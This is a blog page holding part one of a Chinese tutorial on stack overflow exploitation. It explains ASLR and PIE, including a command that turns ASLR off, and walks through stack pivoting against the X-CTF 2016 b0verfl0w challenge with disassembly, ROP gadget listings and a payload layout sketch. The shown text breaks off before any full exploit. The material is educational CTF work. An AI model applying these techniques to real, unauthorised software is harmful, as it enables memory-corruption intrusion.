@@ -1,0 +1,1173 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="Access-Control-Allow-Origin" content="*">
+  <!-- <meta http-equiv="X-Frame-Options" content="ALLOW-FROM https://m.myhkw.cn"> -->
+  <script type="text/javascript">
+    //统计耗时开始
+    var start_time = (new Date()).getTime();
+  </script>
+  <meta http-equiv="Cache-Control" content="no-cache">
+  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
+  <!-- Google SEO -->
+  <meta name="google-site-verification" content="9Wt3lmnrT2bfjaHla5s16adhvcQcBHO7PtNf97n5Od0">
+  <!-- Baidu SEO -->
+  <meta name="baidu-site-verification" content="RYlYHsgO7Y">
+  <!-- SouGou SEO -->
+  <meta name="sogou_site_verification" content="MSmrTj7lHV">
+  <!-- ShenMa SEO -->
+  <meta name="shenma-site-verification" content="e4428ccce0f22fad61c3716193bf4bd7_1571416388"> 
+  <!-- Baidu Union -->
+  <meta name="baidu_union_verify" content="584bb6b4bd24108df082b6d20c7aa9be">
+  
+  <title>推荐系列-栈溢出技巧（上） | 狂欢马克思</title>
+<!--  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">-->
+  
+    <meta name="keywords" content="分享技术经验与交流">
+  
+  <meta name="description" content="&amp;emsp;&amp;emsp;ASLR和PIE 我们都知道由于受到堆栈和libc地址可预测的困扰，ASLR被设计出来并得到广泛应用，后来各种绕过技术出现，比如return-to-plt、got hijack、stack-pivot(bypass stack ransomize)等的…">
+<meta name="keywords" content="Popular">
+<meta property="og:type" content="article">
+<meta property="og:title" content="推荐系列-栈溢出技巧（上）">
+<meta property="og:url" content="https://www.hosiang.cn/16433f9b/index.html">
+<meta property="og:site_name" content="狂欢马克思">
+<meta property="og:description" content="&amp;emsp;&amp;emsp;ASLR和PIE 我们都知道由于受到堆栈和libc地址可预测的困扰，ASLR被设计出来并得到广泛应用，后来各种绕过技术出现，比如return-to-plt、got hijack、stack-pivot(bypass stack ransomize)等的…">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+<meta property="og:updated_time" content="2021-07-23T15:43:07.021Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="推荐系列-栈溢出技巧（上）">
+<meta name="twitter:description" content="&amp;emsp;&amp;emsp;ASLR和PIE 我们都知道由于受到堆栈和libc地址可预测的困扰，ASLR被设计出来并得到广泛应用，后来各种绕过技术出现，比如return-to-plt、got hijack、stack-pivot(bypass stack ransomize)等的…">
+<meta name="twitter:image" content="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png">
+  
+  
+    <link rel="icon" href="/images/favicon.ico">
+  
+  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link href="https://cdn.bootcss.com/font-awesome-animation/0.1.0/font-awesome-animation.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+  <!-- Baidu Analytics -->
+
+<script>
+	//百度统计
+	var _hmt = _hmt || [];
+	(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?3cd8fa109426bf3f10bd5c362175bace";
+	var s = document.getElementsByTagName("script")[0];
+	s.parentNode.insertBefore(hm, s);
+	})();
+</script>
+
+  
+
+  <!--<script type="text/javascript" src="https://code.jquery.com/jquery-latest.js"></script>-->
+  <!-- Baidu seo -->
+
+<script>
+//百度SEO-自动推送
+(function() {
+	var bp = document.createElement('script');
+	var curProtocol = window.location.protocol.split(':')[0];
+	if (curProtocol === 'https') {
+	bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+	} else {
+	bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	}
+	var s = document.getElementsByTagName("script")[0];
+	s.parentNode.insertBefore(bp, s);
+});
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+</html>
+<script src="/js/jquery.min.js"></script>
+<script src="/js/pace.min.js"></script>
+<script src="/js/crypto-js.js"></script>
+<script src="/js/cookie.js"></script>
+<script src="/js/calendar.js"></script>
+<script src="/js/festival.js"></script>
+
+<script>
+    //获取节日名称和日期
+    getFestival();
+</script>
+
+
+<body>
+    <script>
+        //耗时统计结束
+        window.onload = function(){
+          document.getElementById("TimeShow").innerHTML = "本站耗时 "+ (new Date().getTime()-start_time)/1000 +" 秒 ";
+        }	
+    </script>
+  <div id="container">
+      <header id="header">
+   <div id="banner"></div>
+    <div id="header-outer">
+        <div id="header-menu" class="header-menu-pos animated">
+            <div class="header-menu-container">
+                <a href="/" class="left">
+                    <span class="site-title">狂欢马克思</span>
+                </a>
+                <nav id="header-menu-nav" class="right">
+                    
+                    <a href="/ " rel="external nofollow">
+                        <i class="fa fa-home"></i>
+                        <span>主页</span>
+                    </a>
+                    
+                    <a href="/archives " rel="external nofollow">
+                        <i class="fa fa-archive"></i>
+                        <span>归档</span>
+                    </a>
+                    
+                    <a href="/gitbook " rel="external nofollow">
+                        <i class="fa fa-columns"></i>
+                        <span>笔记</span>
+                    </a>
+                    
+                    <a href="/music?id=91451362 " rel="external nofollow">
+                        <i class="fa fa-music"></i>
+                        <span>音乐</span>
+                    </a>
+                    
+                    <a href="/photo " rel="external nofollow">
+                        <i class="fa fa-picture-o"></i>
+                        <span>相册</span>
+                    </a>
+                    
+                    <a href="/love " rel="external nofollow">
+                        <i class="fa fa-heart"></i>
+                        <span>恋爱</span>
+                    </a>
+                    
+                    <a href="/collection " rel="external nofollow">
+                        <i class="fa fa-envira"></i>
+                        <span>收藏</span>
+                    </a>
+                    
+                    <a href="/about " rel="external nofollow">
+                        <i class="fa fa-user"></i>
+                        <span>关于</span>
+                    </a>
+                    
+                </nav>
+                <a class="mobile-header-menu-button">
+                    <i class="fa fa-bars"></i>
+                </a>
+            </div>
+        </div>
+        <div id="header-row">
+            <div id="logo">
+                <a href="/">
+                    <img src="/../images/logo.png" alt="logo">
+                </a>
+            </div>
+            <div class="header-info">
+                <div id="header-title">
+                    
+                    <h2>
+                        狂欢马克思
+                    </h2>
+                    
+                </div>
+                <div id="header-description">
+                    
+                    <h3>
+                        专注Web开发
+                    </h3>
+                    
+                </div>
+            </div>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a title="Github" target="_blank" href="//github.com/Hosiang1026 " rel="external nofollow">
+                            <i class="fa fa-github fa-2x"></i></a>
+                    
+                        <a title="QQ" target="_blank" href="//wpa.qq.com/msgrd?v=3&uin=641904695&site=qq&menu=yes " rel="external nofollow">
+                            <i class="fa fa-qq fa-2x"></i></a>
+                    
+                        <a title="Weibo" target="_blank" href="//www.weibo.com/haoxiang969 " rel="external nofollow">
+                            <i class="fa fa-weibo fa-2x"></i></a>
+                    
+                </div>
+            </nav>
+        </div>
+      
+
+<!-- 诗词接口暂时不用-->
+<!-- <span id='jinrishici-sentence'>-->
+<!-- <script type="text/javascript" src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script> -->
+ 
+<!-- 滚动公告 -->
+<div id="noticeId" class="show" style="background: rgb(244, 247, 247, 0.3);">
+    <marquee id="noticeMar" behavior="scoll" class="notice" direction="left" onmouseover="this.stop();" onmouseout="this.start();">
+    </marquee>
+</div>
+<script type="text/javascript">
+
+$(function(){
+    browserRedirect(); 
+    //获取周末
+    //getWeekend();
+    
+    //var arr = [1, 2];
+    //var bol = arr[Math.floor(Math.random()*arr.length)];
+    //if(bol == 1){
+      //获取一言
+      if($("#hitokoto").length>0){
+         getHitokoto();
+      }
+    //}
+    
+    //if(bol == 2){
+     //获取疫情数据
+     //if($("#YQData").length>0){
+      //getYQData();
+     //}
+   // }
+});
+
+/**
+ * 检测PC端与移动端访问
+ */
+function browserRedirect() {
+    var sUserAgent = navigator.userAgent.toLowerCase();
+    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
+    var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
+    var bIsMidp = sUserAgent.match(/midp/i) == "midp";
+    var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
+    var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
+    var bIsAndroid = sUserAgent.match(/android/i) == "android";
+    var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
+    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
+
+    var contentHtml = "";
+    var fontColor = randomColor();
+    if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
+    
+       $("#noticeId").css({"line-height":"1.6em"});
+       contentHtml = "<font style='color:"+fontColor+"' face='新华宋体'  size='2'>"+
+            
+           "官宣：<span id='weekend'></span><span id='msg'></span><span id='timer'></span>"
+            
+           +"<span id='hitokoto'></span></span></span><span id='YQData'></font> ";
+
+    } else {
+       $("#noticeId").css({"line-height":"3.6em","margin-top":"20px"});
+       contentHtml = "<font style='color:"+fontColor+"' face='新华宋体'  size='6'>" +
+            
+           "官宣：<span id='weekend'></span><span id='msg'></span><span id='timer'></span>"
+             
+           +"<span id='hitokoto'></span></span><span id='YQData'></span></font> ";
+    }
+    
+    $("#noticeMar").html(contentHtml);
+
+}
+
+//随机生成十六进制颜色值
+function randomColor(){
+    //定义字符串变量colorValue存放可以构成十六进制颜色值的值
+    var colorValue="0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f";
+    //以","为分隔符，将colorValue字符串分割为字符数组["0","1",...,"f"]
+    var colorArray = colorValue.split(",");
+    var color="#";//定义一个存放十六进制颜色值的字符串变量，先将#存放进去
+    //使用for循环语句生成剩余的六位十六进制值
+    for(var i=0;i<6;i++){
+        // 由16个元素组成的colorArray的某一个值，然后将其加在color中，
+        //字符串相加后，得出的仍是字符串
+        color+=colorArray[Math.floor(Math.random()*16)];
+    }
+    return color;
+}
+</script>
+
+
+
+
+
+    </div>
+</header>
+
+<script>
+//重写live2D的console打印
+console.log=function(){};
+</script>
+
+
+      <!-- 悬浮音乐播放器 -->
+      <!--<script id="ilt" src=/player/js/player.js></script>-->
+      <div class="outer">
+          <section id="main" class="body-wrap"><article id="post-栈溢出技巧（上）" class="article article-type-post" itemscope itemprop="blogPost">
+
+    <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="post-title" itemprop="name">
+      推荐系列-栈溢出技巧（上）
+    </h1>
+    <div class="post-title-bar">
+      <ul>
+          
+              <li>
+                  <i class="fa fa-book"></i>
+                  
+                      <a href="/categories/热门文章/">热门文章</a>
+                  
+              </li>
+          
+        <li>
+          <i class="fa fa-calendar"></i>  2021-04-15
+        </li>
+        <li>
+          <i class="fa fa-eye"></i>
+          <span id="busuanzi_value_page_pv"></span>
+        </li>
+        <li>
+        <span class="post-count">字数统计: 6k字</span>
+        </li>
+        <li>
+        <span class="post-count">阅读时长: 24分钟</span>
+        </li>
+      </ul>
+    </div>
+  
+
+          
+      </header>
+    
+    <div class="article-entry post-content" itemprop="articleBody">
+      
+            
+            <p>&emsp;&emsp;ASLR和PIE 我们都知道由于受到堆栈和libc地址可预测的困扰，ASLR被设计出来并得到广泛应用，后来各种绕过技术出现，比如return-to-plt、got hijack、stack-pivot(bypass stack ransomize)等的…<br><a id="more"></a></p>
+<h3 id="ASLR和PIE"><a href="#ASLR和PIE" class="headerlink" title="ASLR和PIE"></a>ASLR和PIE</h3><p>我们都知道由于受到堆栈和libc地址可预测的困扰，ASLR被设计出来并得到广泛应用，后来各种绕过技术出现，比如return-to-plt、got hijack、stack-pivot(bypass stack ransomize)等的出现，PIE保护应运而生了。一般地都会把地址空间随机化和PIE混为一谈，没有详细地去了解过两者的区别（可能只有我没了解过，大佬们飘过即可），因为先来看一下两者的区别。ASLR（地址空间随机化）刚开始设计的时候是作为操作系统功能提供的，只考虑了当时技术背景下executable加载后stack、heap、libraries的随机化功能，也就是“对stack、heap、libraries的随机化”。值得一提的它是在ELF加载这个过程中起作用的介质，ASLR有三个级别：0， 不开启任何随机化；1， 开启stack、libraries [、executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化；2，开启heap随机化在linux中我们一般这样去设置 </p>
+<pre><code class="java">  root@pwn-PC:~# cat /proc/sys/kernel/randomize_va_space 
+<span class="number">1</span>
+root@pwn-PC:~# echo 0 &gt; /proc/sys/kernel/randomize_va_space 
+root@pwn-PC:~# cat /proc/sys/kernel/randomize_va_space 
+<span class="number">0</span>
+
+</code></pre>
+<p>我们看下三者的区别：0不开启任何随机化的时候，怎么都不变，下面的是randomize_va_space值为1的时候，我们主要是注意，变化的：libc.so、ld.so和stack，不变的：.text、data、rodata、bss、vsyscall和heap。ps：BSS段 （bss segment）通常是指用来存放程序中未初始化的全局变量和静态变量（不带 const 修饰）的一块内存区域，是静态内存，不占用程序文件的大小，但是占用程序运行时的内存空间，而且初始化为0的全局变量也存在着bss段。data段用于维护初始化的且初始值非0的全局变量和静态变量（不带 const 修饰），但是它在在目标文件中占用空间。rodata段用于常量字符串、带 const 修饰的全局变量和静态变量，这是只能读的数据。<img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>当randomize_va_space值为2的时候，heap也在变化，但是vsyscall依然不变。<img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>再做一个实验，我们开启PIE，然后将randomize_va_space值设置为0。只此之前先简单介绍一下PIE，它是一个针对代码段.text, 数据段.*data，.bss等固定地址的一个防护技术，在elf每次被加载时都变换加载基址。我们会发现两点，一、及时开启了PIE，但是在randomize_va_space值设置为0的情况下，每次加载的基址也是固定的；二、黄色圈起的部分明显比没有PIE时的程序加载的基址要大很多。<img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>继续将randomize_va_space值设置为1，此时可以看到除了vsyscall依然镇守高地以外，其它都在随机化，就连heap也在随机化（对比上一个randomize_va_space为1的情景）。<img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>randomize_va_space值设置为2的时候就不用看了，和上图一样。做完这些实验后，可以总结如下三点：一、根据图二印证了，PIE只是在编译的过程中赋予了ELF加载到内存时其加载基址随机化的功能，也就是编译后的文件已经具备了这个能力。二、经过图二和图三对比可以发现，具备了PIE能力的ELF，只有在有了ASLR这个允许的施展它PIE能力的环境下（无论是1，还是2），在加载的时候，PIE的作用才会显示出来（此时heap也会随机化）。三、vsyscall页面在每个进程中是静态分配了相同的地址，是固定的，后来的vdso弥补了这一缺陷。<br>ps：一、虽然PIE+ASLR后加载的基址是变化的，但是偏移量是不变的，是固定的，因此在利用的时候可以利用偏移量作为tips。二、内存页的大小是0x1000，因此加载后的程序，只有最后一个字节半处的地址是固定的，不变的。比如libc_start_main@@GLIBC_2.2.5的偏移是0x20740，那么无论加载多少次，在elf运行程序中libc_start_main@@GLIBC_2.2.5的地址为0x?????????740，最后一个字节半一直是740。<br>本文涉及相关实验：基于栈溢出的攻击分析（栈溢出是由于C语言系列没有内置检查机制来确保复制到缓冲区的数据不得大于缓冲区的大小，因此当这个数据足够大的时候，将会溢出缓冲区的范围。） </p>
+<h3 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h3><p>说完了上一节的内容，我们继续���下看，但是要注意上一节的内存，在整个栈溢出技巧中都会涉及到。先来看stack pivoting，这是2015年Computer Security Applications Conference发表的一篇名为Defeating ROP Through Denial of Stack Pivot文章讲到的，大体意思是劫持栈指针指向攻击者所能控制的内存处，然后在适当的位置里面进行 ROP，进而通过控制sp指向payload，触发payload的执行。这是绕过地址空间随机化的一种方法，根据定义归结于以下几种情况进行进行使用：构造这么一个32位的情景：如果栈溢出的空间无法满足构造的payload的大小的需求，那么就需要进行栈迁移了。但是如果又开启了ASLR，或者PIE，那么我们需要将栈劫持到已知的区域，如同定义说的一样需要控制esp指针指向payload，那么就可以通过stack pivot将栈劫持到相应的区域。这个已知的区域有两种，一种是没开启PIE的时候，可以迁移到bss段上的变量，并且bss 段分配的内存页拥有读写权限；第二种是通过ESP进行寻找到的区域。或者又另一种情况下其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，在栈溢出中不讨论这种情况。在上述场景中，有个关键点：控制EIP和ESP指针，那么使用gadget也很多，比如pop esp，或者 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针，或者更高级的一些fake frame，像我这么笨的菜鸡学到这后，都有一定的随机应变的能力，相信大家也是一样的，原理懂了后，根据题目的不同进行随机应变。 </p>
+<h3 id="X-CTF-2016-b0verfl0w"><a href="#X-CTF-2016-b0verfl0w" class="headerlink" title="X-CTF 2016 b0verfl0w"></a>X-CTF 2016 b0verfl0w</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>可以看到是存在明显的栈溢出漏洞，但是可利用的空间较小，并且存在ASLR机制。 </p>
+<pre><code class="java">  <span class="function">signed <span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">char</span> s; <span class="comment">// [esp+18h] [ebp-20h]</span>
+  puts(<span class="string">"\n======================"</span>);
+  puts(<span class="string">"\nWelcome to X-CTF 2016!"</span>);
+  puts(<span class="string">"\n======================"</span>);
+  puts(<span class="string">"What's your name?"</span>);
+  fflush(stdout);
+  fgets(&amp;s, <span class="number">50</span>, stdin);
+  printf(<span class="string">"Hello %s."</span>, &amp;s);
+  fflush(stdout);
+  <span class="keyword">return</span> <span class="number">1</span>;
+}
+<span class="number">0x804850e</span> &lt;main&gt;:   push   ebp
+   <span class="number">0x804850f</span> &lt;main+<span class="number">1</span>&gt;:  mov    ebp,esp
+   <span class="number">0x8048511</span> &lt;main+<span class="number">3</span>&gt;:  and    esp,<span class="number">0xfffffff0</span>
+   <span class="number">0x8048514</span> &lt;main+<span class="number">6</span>&gt;:  call   <span class="number">0x804851b</span> &lt;vul&gt;
+   <span class="number">0x8048519</span> &lt;main+<span class="number">11</span>&gt;: leave  
+   <span class="number">0x804851a</span> &lt;main+<span class="number">12</span>&gt;: ret    
+   <span class="number">0x804851b</span> &lt;vul&gt;: push   ebp
+   <span class="number">0x804851c</span> &lt;vul+<span class="number">1</span>&gt;:   mov    ebp,esp
+   <span class="number">0x804851e</span> &lt;vul+<span class="number">3</span>&gt;:   sub    esp,<span class="number">0x38</span>
+   <span class="number">0x8048521</span> &lt;vul+<span class="number">6</span>&gt;:   mov    DWORD PTR [esp],<span class="number">0x8048640</span>
+   <span class="number">0x8048528</span> &lt;vul+<span class="number">13</span>&gt;:  call   <span class="number">0x80483d0</span> &lt;puts<span class="meta">@plt</span>&gt;
+   <span class="number">0x804852d</span> &lt;vul+<span class="number">18</span>&gt;:  mov    DWORD PTR [esp],<span class="number">0x8048658</span>
+   <span class="number">0x8048534</span> &lt;vul+<span class="number">25</span>&gt;:  call   <span class="number">0x80483d0</span> &lt;puts<span class="meta">@plt</span>&gt;
+   <span class="number">0x8048539</span> &lt;vul+<span class="number">30</span>&gt;:  mov    DWORD PTR [esp],<span class="number">0x8048640</span>
+   <span class="number">0x8048540</span> &lt;vul+<span class="number">37</span>&gt;:  call   <span class="number">0x80483d0</span> &lt;puts<span class="meta">@plt</span>&gt;
+   <span class="number">0x8048545</span> &lt;vul+<span class="number">42</span>&gt;:  mov    DWORD PTR [esp],<span class="number">0x8048670</span>
+   <span class="number">0x804854c</span> &lt;vul+<span class="number">49</span>&gt;:  call   <span class="number">0x80483d0</span> &lt;puts<span class="meta">@plt</span>&gt;
+   <span class="number">0x8048551</span> &lt;vul+<span class="number">54</span>&gt;:  mov    eax,ds:<span class="number">0x804a060</span>
+   <span class="number">0x8048556</span> &lt;vul+<span class="number">59</span>&gt;:  mov    DWORD PTR [esp],eax
+   <span class="number">0x8048559</span> &lt;vul+<span class="number">62</span>&gt;:  call   <span class="number">0x80483b0</span> &lt;fflush<span class="meta">@plt</span>&gt;
+   <span class="number">0x804855e</span> &lt;vul+<span class="number">67</span>&gt;:  mov    eax,ds:<span class="number">0x804a040</span>
+   <span class="number">0x8048563</span> &lt;vul+<span class="number">72</span>&gt;:  mov    DWORD PTR [esp+<span class="number">0x8</span>],eax
+   <span class="number">0x8048567</span> &lt;vul+<span class="number">76</span>&gt;:  mov    DWORD PTR [esp+<span class="number">0x4</span>],<span class="number">0x32</span>
+   <span class="number">0x804856f</span> &lt;vul+<span class="number">84</span>&gt;:  lea    eax,[ebp-<span class="number">0x20</span>]
+   <span class="number">0x8048572</span> &lt;vul+<span class="number">87</span>&gt;:  mov    DWORD PTR [esp],eax
+=&gt; <span class="number">0x8048575</span> &lt;vul+<span class="number">90</span>&gt;:  call   <span class="number">0x80483c0</span> &lt;fgets<span class="meta">@plt</span>&gt;
+   <span class="number">0x804857a</span> &lt;vul+<span class="number">95</span>&gt;:  lea    eax,[ebp-<span class="number">0x20</span>]
+   <span class="number">0x804857d</span> &lt;vul+<span class="number">98</span>&gt;:  mov    DWORD PTR [esp+<span class="number">0x4</span>],eax
+   <span class="number">0x8048581</span> &lt;vul+<span class="number">102</span>&gt;: mov    DWORD PTR [esp],<span class="number">0x8048682</span>
+   <span class="number">0x8048588</span> &lt;vul+<span class="number">109</span>&gt;: call   <span class="number">0x80483a0</span> &lt;printf<span class="meta">@plt</span>&gt;
+   <span class="number">0x804858d</span> &lt;vul+<span class="number">114</span>&gt;: mov    eax,ds:<span class="number">0x804a060</span>
+   <span class="number">0x8048592</span> &lt;vul+<span class="number">119</span>&gt;: mov    DWORD PTR [esp],eax
+   <span class="number">0x8048595</span> &lt;vul+<span class="number">122</span>&gt;: call   <span class="number">0x80483b0</span> &lt;fflush<span class="meta">@plt</span>&gt;
+   <span class="number">0x804859a</span> &lt;vul+<span class="number">127</span>&gt;: mov    eax,<span class="number">0x1</span>
+   <span class="number">0x804859f</span> &lt;vul+<span class="number">132</span>&gt;: leave  
+   <span class="number">0x80485a0</span> &lt;vul+<span class="number">133</span>&gt;: ret  
+
+</code></pre>
+<p><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>通过分析：溢出空间0x12的空间，也就是4个内存单元，地址随机化后，我们要利用栈溢出，只能先泄漏基址，空间有限所以不可能实现了，那么此时就用到��stack pivoting将栈劫持到一个已知空间中，而且有足够构造payload的空间。那么这个空间在哪呢？继续看<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>可以发现fgets并不影响esp，至始至终 esp的值没有变，而且esp中存储的依然是&amp;s，也就是s的栈地址，那么我们就可以通过esp可以直接找到s的位置，不需要实际知道具体的地址数值，直接jmp esp就可以，使得eip指向0xffffbe38（劫持栈，然后控制eip）。那么payload放在哪里？当然是s的栈地址处，也就是ebp-0x20。此时可以这样设想，控制esp来指向我们的payload，然后通过jmp esp跳到payload处，然后通过ret指令控制eip，进而执行payload。那么需要做的事情就是：一、找到通过jmp esp的gadgets二、控制esp指向的地址就是payload的地址，也就是s的栈地址三、esp的操作完成后，控制eip进行执行payload </p>
+<h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>这里先把用到的gadget找到 </p>
+<pre><code class="java">  pwn<span class="meta">@pwn</span>-PC:~/Desktop/pwntips$ ROPgadget --binary b0verfl0w --only <span class="string">'jmp|ret'</span>
+Gadgets information
+============================================================
+<span class="number">0x080483ab</span> : jmp <span class="number">0x8048390</span>
+<span class="number">0x080484f2</span> : jmp <span class="number">0x8048470</span>
+<span class="number">0x08048611</span> : jmp <span class="number">0x8048620</span>
+<span class="number">0x08048504</span> : jmp esp
+<span class="number">0x0804836a</span> : ret
+<span class="number">0x0804847e</span> : ret <span class="number">0xeac1</span>
+
+Unique gadgets found: <span class="number">6</span>
+pwn<span class="meta">@pwn</span>-PC:~/Desktop/pwntips$ ROPgadget --binary b0verfl0w --only <span class="string">'sub|ret'</span>
+Gadgets information
+============================================================
+<span class="number">0x0804836a</span> : ret
+<span class="number">0x0804847e</span> : ret <span class="number">0xeac1</span>
+<span class="number">0x08048500</span> : sub esp, <span class="number">0x24</span> ; ret
+
+Unique gadgets found: <span class="number">3</span>
+
+</code></pre>
+<p>然后通过ret将gadgets数据变成指令进行执行（eip中存储的是某一条指令的地址，地址，所以你直接把指令写在栈上，通过ret没办法执行）这里就需要栈溢出了通过栈溢出，（在当前栈帧，也就是你的payload是在当前栈上搭建的，需要此栈对应的leave ret 来进行栈溢出），不多说，很简单大体捋一下流程：粗略构造一下 </p>
+<pre><code class="java">  ----------------
+payload
+----------------
+fake ebp
+----------------
+jmp esp addr
+----------------
+...
+----------------
+
+</code></pre>
+<p>发生栈溢出后，eip指向jmp esp addr，程序执行jmp esp，但是问题来了，此时的esp在…的内存单元地址处，我们本来是想用jmp esp跳到payload处，可是不能达到目的。那么怎么构造？ </p>
